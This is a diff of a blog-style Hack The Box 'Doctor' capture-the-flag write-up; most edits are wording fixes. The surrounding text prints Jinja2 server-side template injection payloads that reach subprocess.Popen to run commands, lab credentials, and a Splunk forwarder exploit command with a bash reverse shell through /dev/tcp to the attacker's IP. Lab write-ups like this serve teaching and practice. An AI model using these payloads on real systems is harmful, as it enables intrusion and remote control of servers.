@@ -148,7 +148,7 @@ vagrant@ko:~/Desktop/HackTheBox/Doctor$ nikto -h 10.10.10.209
 </details>
 
 
-### Port 8089 - Splund
+### Port 8089 - Splunkd
 The following screenshot shows the Universal Forwarder agent, this initial page is accessible without authentication and can be used to enumerate hosts running Splunk Universal Forwarder.
 
 <p class="imgMiddle">
@@ -209,11 +209,13 @@ I poked around for a while, intercepting the requests, and I stumbled across `ht
 
 ```
 
+At this point, I assumed that it was either a XML entity encoding flaw or server side template injection (SSTI). In order to test the theory, I decided to start with a simple multiplication formula within the header and body fields of the messaging board:
+
 <p class="imgMiddle">
 <img src="/assets/img/ChallengeVMs/Doctor/img6.png"  style="width: 75%" />
 </p>
 
-At this point, I assumed that it was either a XML entity encoding flaw or server side template injection (SSTI). In order to test the theory, I decided to start with a simple multiplication formula within the header and body fields of the messaging board:
+After submitting the formula, I went back to the `/archive` page and viewed the source code which revealed the following:
 
 <p class="imgMiddle">
 <img src="/assets/img/ChallengeVMs/Doctor/img7.png"  style="width: 70%" />
@@ -255,10 +257,10 @@ The following post provides a great overview of SSTI, including definitions for 
 * `config.from_object('os')`
 * `''.__class__.__mro__ ` 
 * `''.__class__.__mro__[1].__subclasses__()` -- this command confirmed that we were exploiting the jinja2 environment as it was listed as a subclass.
-`''.__class__.__mro__[1].__subclasses__()[406:]`
+* `''.__class__.__mro__[1].__subclasses__()[406:]`
 
 
-For the last part, I used burpsuite repeater to determine that the index for the class `subprocess.Popen` was `407`. With the index for `subprocess.Popen`, I tried using some basic commands. The first one I tried was `ls`:
+For the last part, I used BurpSuite repeater to determine that the index for the class `subprocess.Popen` was `407`. With the index for `subprocess.Popen`, I tried using some basic commands. The first one I tried was `ls`:
 
 ```python
 ''.__class__.mro()[1].__subclasses__()[407]('ls',shell=True,stdout=-1).communicate()[0].strip()
@@ -341,7 +343,7 @@ sudo: a terminal is required to read the password; either use the -S option to r
 
 </details>
 
-within the `/home/web` directory, I found a file named `blog.sh`. The contents of the file are shown below:
+Within the `/home/web` directory, I found a file named `blog.sh`. The contents of the file are shown below:
 
 ```text
 cat blog.sh
@@ -367,7 +369,7 @@ class Config:
     MAIL_PASSWORD = "doctor"
 ```
 
-Even though we have a username and password for `doctor`, a quick look at `/etc/passwd` shows us that the user doesn't exist. After uploading `LinPEAS` to the server's `/tmp` directory, the output had a ton of information including the fact that the `adm` group that the `web` user was a part of, was able to read `cups` and `apache2` access logs:
+Even though I now had a username and password for `doctor`, a quick look at `/etc/passwd` shows me that the user didn't exist. After uploading `LinPEAS` to the server's `/tmp` directory, the output had a ton of information including the fact that the `adm` group that the `web` user was a part of, was able to read `cups` and `apache2` access logs:
 
 <details>
 
@@ -446,7 +448,7 @@ sudo -l
 Sorry, user shaun may not run sudo on doctor.
 ```
 
-I decided to run the `LinPEAS.sh` file that I uploaded previously. One of the interesting service that was running was obviously `splunkd` as we saw initially. Since port 8089 was open and actively serving the API, I decided to search for some Splunkd exploits while I was waiting for LinPEAS to complete. In order to ensure that the user had access to the Splunk API, I attempted to authenticate to the web service:<https://10.10.10.209:8089/services>
+I decided to run the `LinPEAS.sh` file that I uploaded previously. One of the interesting services that was running was obviously `splunkd` as we saw initially. Since port 8089 was open and actively serving the API, I decided to search for some Splunkd exploits while I was waiting for LinPEAS to complete. In order to ensure that the user had access to the Splunk API, I attempted to authenticate to the web service:<https://10.10.10.209:8089/services>
 
 <p class="imgMiddle">
 <img src="/assets/img/ChallengeVMs/Doctor/img10.png"  style="width: 70%" />
@@ -469,7 +471,7 @@ PySplunkWhisperer2_remote.py: error: the following arguments are required: --hos
 ```
 </details>
 
-The exploit itself looked simple enough so I decided to try it. The command that I used is shown below:
+The exploit itself looked simple enough so I decided to try it. The command that I used as well as the successful exploitation thereof is shown below:
 
 ```python
 python PySplunkWhisperer2_remote.py --lhost 10.10.14.106 --host 10.10.10.209 --username shaun --password Guitar123 --payload '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.106/1234 0>&1"'
